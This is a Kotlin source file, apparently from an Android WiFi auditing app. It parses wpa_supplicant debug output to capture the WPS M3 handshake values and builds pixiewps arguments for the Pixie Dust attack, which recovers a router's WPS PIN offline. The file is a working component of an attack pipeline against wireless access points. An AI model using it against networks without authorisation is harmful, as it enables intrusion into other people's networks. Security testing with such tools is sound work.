/*
 * AmWF - Android WiFi Monitor Mode Controller
 * Copyright (C) 2026 Hitomatito
 *
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

package com.hitomatito.amwf.wifi.pixiedust

import java.util.concurrent.BlockingQueue
import java.util.concurrent.TimeUnit

/**
 * Parser de los campos del mensaje WPS M3 extraídos del debug de wpa_supplicant.
 *
 * wpa_supplicant con el flag -K vuelca las claves WPS por su salida de debug.
 * Este parser extrae los seis valores necesarios para el ataque Pixie Dust:
 *   - E-Nonce (nonce del enrollee)
 *   - PKE  (clave pública DH del peer / enrollee)
 *   - PKR  (clave pública DH propia / registrador)
 *   - AuthKey
 *   - E-Hash1
 *   - E-Hash2
 *
 * Soporta ambos formatos de línea que wpa_supplicant puede emitir:
 *   1) Formato clave=valor:  WPS-M3: ENONCE=.... PKE=.... PKR=.... AUTHKEY=.... EHASH1=.... EHASH2=....
 *   2) Formato hexdump:      WPS: Enrollee Nonce: hex...
 *
 * Esta es una implementación original de AmWF (licencia GPL-3.0-or-later).
 */
object M3Parser {

    /** Los seis campos del M3, en orden de aparición esperado. */
    private enum class M3Field(val label: String) {
        ENROLLEE_NONCE("Enrollee Nonce"),
        OWN_PUBLIC_KEY("DH own Public Key"),
        PEER_PUBLIC_KEY("DH peer Public Key"),
        AUTH_KEY("AuthKey"),
        E_HASH_1("E-Hash1"),
        E_HASH_2("E-Hash2");

        override fun toString(): String = label
    }

    /**
     * Longitud hexadecimal exacta esperada por campo (en caracteres).
     *
     * Validar la longitud evita aceptar volcados truncados del supplicant de
     * Android (32 bytes) como si fueran claves DH completas (192 bytes).
     */
    private fun expectedHexLength(field: M3Field): Int = when (field) {
        M3Field.ENROLLEE_NONCE -> 32
        M3Field.OWN_PUBLIC_KEY,
        M3Field.PEER_PUBLIC_KEY -> 384
        M3Field.AUTH_KEY,
        M3Field.E_HASH_1,
        M3Field.E_HASH_2 -> 64
    }

    /** Tiempo de espera adicional (ms) tras capturar los 6 campos para intentar
     *  capturar también M5/M7 (modo 3, chips RTL819x). */
    private const val M5M7_DWELL_MS = 4_000L

    /**
     * Centinela que el productor encola al cerrar el stream. Permite
     * distinguir "no hay línea todavía" (null) de "el proceso terminó".
     */
    const val END_OF_STREAM = "\u0000AMWF_EOF"

    private val WPS_M3_PREFIX = "WPS-M3: "
    private val M5_PREFIX = "WPS-M5:"
    private val M7_PREFIX = "WPS-M7:"

    // Formato clave=valor: ENONCE=..., PKE=..., etc.
    private val KEY_VALUE = Regex("""([A-Z0-9]+)=([0-9a-fA-F]+)""")
    private val BSSID_VALUE = Regex("""BSSID=([0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5})""")
    private val ENCR_VALUE = Regex("""ENCR=([0-9a-fA-F]+)""")

    // Formato hexdump real de wpa_supplicant 2.11:
    //   "WPS: Enrollee Nonce - hexdump(len=16): 1a 2b 3c ..."
    // El volcado completo solo aparece cuando el binario se compila sin
    // CONFIG_ANDROID_LOG (el de Android trunca a 32 bytes y va a logcat).
    private val HEXDUMP_LINE = Regex("""WPS:\s*(.+?)\s*-\s*hexdump\(len=\d+\):\s*([0-9a-fA-F ]+)""")

    // Formato hexdump: "WPS: Enrollee Nonce: 1a 2b 3c ..."
    private val FIELD_LINE = Regex("""WPS:\s*([A-Za-z0-9][A-Za-z0-9 \-]*):\s*([0-9a-fA-F :]+)""")

    // El supplicant anuncia el fallo con esta línea cuando el AP aborta.
    // Ej.: "wlan0: WPS-FAIL msg=5 config_error=15"
    private val WPS_FAIL_LINE = Regex("""WPS-FAIL\s+msg=\d+\s+config_error=(\d+)""")
    private val NEGOTIATION_ERROR_LINE = Regex(
        """Enrollee terminated negotiation with Configuration Error (\d+)"""
    )

    /**
     * Resultado del parseo del M3.
     */
    sealed class M3Capture {
        data class Complete(
            val data: M3Data,
            val m5m7: M5M7Capture? = null
        ) : M3Capture()
        data class Incomplete(
            val capturedCount: Int,
            val missing: List<String>
        ) : M3Capture()
        /**
         * El AP terminó la negociación WPS antes de enviar el M3. El caso más
         * habitual es `config_error=15` (Setup Locked): el WPS del AP está
         * bloqueado y no liberará las E-Hash hasta que se desbloquee.
         */
        data class Failed(
            val reason: String,
            val configError: Int? = null
        ) : M3Capture()
    }

    /**
     * Los seis campos M3 necesarios para ejecutar pixiewps.
     */
    data class M3Data(
        val enrolleeNonce: String,
        val ownPublicKey: String,
        val peerPublicKey: String,
        val authKey: String,
        val eHash1: String,
        val eHash2: String
    ) {
        /** Argumentos de línea de comandos para pixiewps (modo estándar). */
        fun toPixiewpsArgs(): String =
            "--pke $peerPublicKey --pkr $ownPublicKey --e-hash1 $eHash1 " +
                    "--e-hash2 $eHash2 --authkey $authKey --e-nonce $enrolleeNonce"
    }

    /**
     * Datos opcionales M5/M7 para el modo 3 de pixiewps (chips RTL819x).
     */
    data class M5M7Capture(
        val bssid: String = "",
        val m5Enc: String? = null,
        val m7Enc: String? = null
    ) {
        fun hasBoth(): Boolean = m5Enc != null && m7Enc != null

        fun toPixiewpsMode3Args(m3: M3Data): String =
            "--mode 3 ${m3.toPixiewpsArgs()}" +
                    (bssid.takeIf { it.isNotBlank() }?.let { " --e-bssid $it" } ?: "") +
                    (m5Enc?.let { " -5 $it" } ?: "") +
                    (m7Enc?.let { " -7 $it" } ?: "")
    }

    /**
     * Lee las líneas que un productor encola en [lines] y extrae los campos M3
     * (y opcionalmente M5/M7).
     *
     * El hilo lector encola las líneas y [END_OF_STREAM] al terminar. Así el
     * pipe del supplicant nunca se llena mientras la app espera el socket o
     * ejecuta `wpa_cli ping`.
     *
     * @param lines Cola con la salida de wpa_supplicant.
     * @param timeoutMs Tiempo máximo de espera en ms.
     * @param cancelRequested Función que retorna true si se debe cancelar.
     * @param onLine Callback opcional con cada línea leída (para logging).
     * @param onM5M7 Callback opcional cuando se capturan M5 y M7.
     */
    fun parse(
        lines: BlockingQueue<String>,
        timeoutMs: Long = 25_000L,
        cancelRequested: () -> Boolean = { false },
        onLine: ((String) -> Unit)? = null,
        onM5M7: ((M5M7Capture) -> Unit)? = null
    ): M3Capture = parseSource(
        source = { timeout -> lines.poll(timeout, TimeUnit.MILLISECONDS) },
        timeoutMs = timeoutMs,
        cancelRequested = cancelRequested,
        onLine = onLine,
        onM5M7 = onM5M7
    )

    private fun parseSource(
        source: (Long) -> String?,
        timeoutMs: Long,
        cancelRequested: () -> Boolean,
        onLine: ((String) -> Unit)?,
        onM5M7: ((M5M7Capture) -> Unit)?
    ): M3Capture {
        val fields = arrayOfNulls<String>(6)
        val deadline = System.currentTimeMillis() + timeoutMs
        var counted = 0
        var m5: String? = null
        var m7: String? = null
        var bssid = ""
        var m5m7Notified = false
        var completeReturnAt = Long.MAX_VALUE

        while (System.currentTimeMillis() < deadline &&
            System.currentTimeMillis() < completeReturnAt
        ) {
            if (cancelRequested()) {
                return M3Capture.Incomplete(counted, missingFields(fields))
            }

            try {
                val line = source(50L) ?: continue
                if (line == END_OF_STREAM) break
                if (line.isEmpty()) continue
                onLine?.invoke(line)

                // El AP puede abortar antes de M3 (p. ej. WPS bloqueado).
                // En ese caso no tiene sentido seguir esperando ni reintentar.
                val failMatch = WPS_FAIL_LINE.find(line)
                    ?: NEGOTIATION_ERROR_LINE.find(line)
                if (failMatch != null) {
                    val code = failMatch.groupValues[1].toIntOrNull()
                    // Un NACK con config_error=18 es la respuesta esperada a
                    // un PIN de sonda incorrecto: el AP ya nos ha entregado el
                    // M3 completo antes de rechazarlo. Si los seis campos están
                    // capturados, el M3 es válido y pixiewps debe ejecutarse.
                    if (counted == 6) break
                    // Si el NACK llega sin M3, la captura de esta ronda ha
                    // terminado (el M3 siempre precede al NACK). Se devuelve
                    // Incomplete para que el runner reintente sin esperar los
                    // 25 s completos del timeout.
                    if (code == 18) break
                    return M3Capture.Failed(configErrorReason(code), code)
                }

                // Formato 1: línea WPS-M3: con pares clave=valor
                if (line.contains(WPS_M3_PREFIX)) {
                    bssid = BSSID_VALUE.find(line)?.groupValues?.get(1) ?: bssid
                    parseKeyValueLine(line, fields) { counted++ }
                    if (counted == 6) {
                        completeReturnAt = System.currentTimeMillis() + M5M7_DWELL_MS
                    }
                    continue
                }

                // Formato 2a: hexdump completo de wpa_supplicant 2.11
                // "WPS: <Campo> - hexdump(len=N): xx xx ..."
                val hexdumpMatch = HEXDUMP_LINE.find(line)
                if (hexdumpMatch != null) {
                    val fieldLabel = hexdumpMatch.groupValues[1].trim()
                    val hexValue = hexdumpMatch.groupValues[2]
                        .replace(" ", "")
                        .replace(":", "")
                        .trim()
                    val field = fieldForLabel(fieldLabel)
                    if (field != null && fields[field.ordinal] == null &&
                        hexValue.length == expectedHexLength(field)
                    ) {
                        fields[field.ordinal] = hexValue
                        counted++
                        if (counted == 6) {
                            completeReturnAt = System.currentTimeMillis() + M5M7_DWELL_MS
                        }
                    }
                    continue
                }

                // Formato 2b: líneas hexdump individuales "WPS: <Campo>: <hex>"
                val fieldMatch = FIELD_LINE.find(line)
                if (fieldMatch != null) {
                    val fieldLabel = fieldMatch.groupValues[1].trim()
                    val hexValue = fieldMatch.groupValues[2].replace(" ", "").replace(":", "")
                    val field = fieldForLabel(fieldLabel)
                    if (field != null && fields[field.ordinal] == null &&
                        hexValue.length == expectedHexLength(field)
                    ) {
                        fields[field.ordinal] = hexValue
                        counted++
                        if (counted == 6) {
                            completeReturnAt = System.currentTimeMillis() + M5M7_DWELL_MS
                        }
                    }
                    continue
                }

                // Captura opcional M5/M7 para modo 3 (RTL819x)
                if (line.contains(M5_PREFIX)) {
                    m5 = ENCR_VALUE.find(line)?.groupValues?.get(1)
                    bssid = BSSID_VALUE.find(line)?.groupValues?.get(1) ?: bssid
                    m5m7Notified = maybeNotifyM5M7(onM5M7, m5m7Notified, bssid, m5, m7)
                    continue
                }
                if (line.contains(M7_PREFIX)) {
                    m7 = ENCR_VALUE.find(line)?.groupValues?.get(1)
                    bssid = BSSID_VALUE.find(line)?.groupValues?.get(1) ?: bssid
                    m5m7Notified = maybeNotifyM5M7(onM5M7, m5m7Notified, bssid, m5, m7)
                    continue
                }
            } catch (e: Exception) {
                return M3Capture.Incomplete(counted, missingFields(fields))
            }
        }

        return if (counted == 6) {
            M3Capture.Complete(
                data = M3Data(
                    enrolleeNonce = fields[0]!!,
                    ownPublicKey = fields[1]!!,
                    peerPublicKey = fields[2]!!,
                    authKey = fields[3]!!,
                    eHash1 = fields[4]!!,
                    eHash2 = fields[5]!!
                ),
                m5m7 = if (m5 != null && m7 != null) M5M7Capture(bssid, m5, m7) else null
            )
        } else {
            M3Capture.Incomplete(counted, missingFields(fields))
        }
    }

    /**
     * Traduce los códigos de error de configuración WPS (wps_defs.h) a un
     * mensaje accionable para la UI.
     */
    private fun configErrorReason(code: Int?): String = when (code) {
        5 -> "Señal WPS demasiado débil. Acerca el teléfono al AP y reintenta."
        7 -> "El AP rechazó la asociación WPS. Comprueba que el WPS esté activo."
        8 -> "El AP no obtuvo respuesta DHCP durante la provisión WPS."
        11 -> "El AP no pudo conectar con el registrador WPS."
        13 -> "El AP sospecha un intento de ataque (Rogue Suspected) y bloqueó la sesión."
        14 -> "El AP está ocupado con otra sesión WPS. Espera y reintenta."
        15 -> "WPS bloqueado en el AP (Setup Locked). " +
            "Desbloquea el WPS desde el panel del router o reinícialo, y reintenta."
        16 -> "La sesión WPS agotó el tiempo de espera."
        17 -> "La sesión de registro WPS expiró. Reintenta."
        18 -> "El AP rechazó la autenticación del PIN (Device Password Auth Failure)."
        else -> "El AP terminó la negociación WPS con error de configuración $code."
    }

    private fun fieldForLabel(label: String): M3Field? = when (label) {
        "Enrollee Nonce" -> M3Field.ENROLLEE_NONCE
        "DH own Public Key" -> M3Field.OWN_PUBLIC_KEY
        "DH peer Public Key" -> M3Field.PEER_PUBLIC_KEY
        "AuthKey" -> M3Field.AUTH_KEY
        "E-Hash1" -> M3Field.E_HASH_1
        "E-Hash2" -> M3Field.E_HASH_2
        else -> null
    }

    private fun parseKeyValueLine(line: String, fields: Array<String?>, onCaptured: () -> Unit) {
        for (match in KEY_VALUE.findAll(line)) {
            val key = match.groupValues[1]
            val value = match.groupValues[2]
            val field = when (key) {
                "ENONCE" -> M3Field.ENROLLEE_NONCE
                "PKE" -> M3Field.PEER_PUBLIC_KEY
                "PKR" -> M3Field.OWN_PUBLIC_KEY
                "AUTHKEY" -> M3Field.AUTH_KEY
                "EHASH1" -> M3Field.E_HASH_1
                "EHASH2" -> M3Field.E_HASH_2
                else -> null
            } ?: continue
            if (fields[field.ordinal] != null) continue
            if (value.length != expectedHexLength(field)) continue
            fields[field.ordinal] = value
            onCaptured()
        }
    }

    private fun missingFields(fields: Array<String?>): List<String> =
        M3Field.values().mapNotNull { field ->
            if (fields[field.ordinal] == null) field.name else null
        }

    private fun maybeNotifyM5M7(
        callback: ((M5M7Capture) -> Unit)?,
        alreadyNotified: Boolean,
        bssid: String,
        m5: String?,
        m7: String?
    ): Boolean {
        if (callback == null || alreadyNotified || m5 == null || m7 == null) {
            return alreadyNotified
        }
        callback(M5M7Capture(bssid, m5, m7))
        return true
    }
}
